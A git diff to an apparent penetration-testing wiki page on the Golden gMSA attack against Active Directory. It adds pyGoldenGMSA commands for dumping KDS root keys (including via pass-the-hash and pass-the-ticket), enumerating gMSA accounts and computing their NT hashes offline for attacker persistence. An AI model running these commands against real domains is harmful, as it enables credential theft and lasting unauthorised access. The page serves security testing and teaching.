@@ -1,5 +1,5 @@
 ---
-authors: 4ndr3w6, ShutdownRepo, sckdev
+authors: 4ndr3w6, ShutdownRepo, sckdev, felixbillieres
 category: ad
 ---
 
@@ -47,7 +47,22 @@ GoldenGMSA.exe kdsinfo --forest child.lab.local
 
 === UNIX-like
 
-_At the time of writing this recipe, September 24th, 2022, no equivalent exists (not that we know of), for UNIX-like systems._
+[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) (Python) implements the cryptographic pipeline in Python, enabling KDS root key extraction and gMSA password computation from Linux-based platforms without Windows-specific dependencies.
+
+KDS root keys can be exfiltrated with high-privileged access. Multiple authentication methods are supported:
+
+```bash
+# Password authentication
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP kdsinfo
+
+# Pass-the-Hash authentication
+python3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --nt-hash $NT_HASH kdsinfo
+
+# Pass-the-Ticket (Kerberos) authentication
+python3 main.py -u "$USER" -d $DOMAIN --dc-ip $DC_IP --ccache admin.ccache kdsinfo
+```
+
+The dumped KDS root keys are printed in base64, and can be used for password calculation later on.
 
 :::
 
@@ -86,7 +101,17 @@ GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 
 === UNIX-like
 
-_At the time of writing this recipe, September 24th, 2022, no equivalent exists (not that we know of), for UNIX-like systems._
+[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) can enumerate gMSA accounts and extract the required information (SID, RootKeyGuid, Password ID, and L0/L1/L2 indices) with low-privilege access:
+
+```bash
+# Enumerate all gMSA accounts
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo
+
+# Enumerate a specific gMSA by SID
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP gmsainfo --sid "$GMSA_SID"
+```
+
+The tool outputs the account name, SID, root key GUID, and indices required for password computation.
 
 :::
 
@@ -116,24 +141,45 @@ import hashlib
 
 b64 = input("Password Base64: ")
 
-print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())'
+print("NT hash:", hashlib.new("md4", base64.b64decode()).hexdigest())
 ```
 
 
 
 === UNIX-like
 
-_At the time of writing this recipe, September 24th, 2022, no equivalent exists (not that we know of), for UNIX-like systems._
+[pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) can compute gMSA passwords either online (requiring network access to the DC) or offline (using previously dumped KDS root keys), making it particularly useful for persistence scenarios where the attacker may not have continuous access to the domain.
+
+**Online computation** (automatically retrieves KDS root key and password ID from the DC):
+
+```bash
+python3 main.py -u "$USER@$DOMAIN" -p "$PASSWORD" -d $DOMAIN --dc-ip $DC_IP compute --sid $GMSA_SID
+```
+
+**Offline computation** (no network access required, using previously dumped KDS root key and password ID):
+
+```bash
+python3 main.py compute --sid $GMSA_SID --kdskey "AQAAAOlMCM5U37Qv...<base64>..." --pwdid "AQAAAEtEU0sC...<base64>..."
+```
+
+Unlike the Windows tool, pyGoldenGMSA outputs the NT hash directly in both NT-only format and nxc format, eliminating the need for manual hash conversion:
+
+```
+NT hash:     1c368c74ef1bcbd4892c95a8d6de0f30
+LM:NT format:  aad3b435b51404eeaad3b435b51404ee:1c368c74ef1bcbd4892c95a8d6de0f30
+```
 
 :::
 
 
 > [!TIP]
-> The [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#) tool featured in this recipe can retrieve gMSA password without the `--kdskey` or `--pwdid` arguments, by requesting those information. If the `--kdskey` is not supplied, high-privilege access will be needed by the tool, which is outside the scope of the GoldenGMSA technique explained in this recipe.
+> Both [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) (C#) and [pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA) (Python) tools featured in this recipe can retrieve gMSA password without the `--kdskey` or `--pwdid` arguments, by requesting those information. If the `--kdskey` is not supplied, high-privilege access will be needed by the tool, which is outside the scope of the GoldenGMSA technique explained in this recipe.
 
 ## Resources
 
 [https://github.com/Semperis/GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
+
+[https://github.com/felixbillieres/pyGoldenGMSA](https://github.com/felixbillieres/pyGoldenGMSA)
 
 [https://www.semperis.com/blog/golden-gmsa-attack](https://www.semperis.com/blog/golden-gmsa-attack)
 
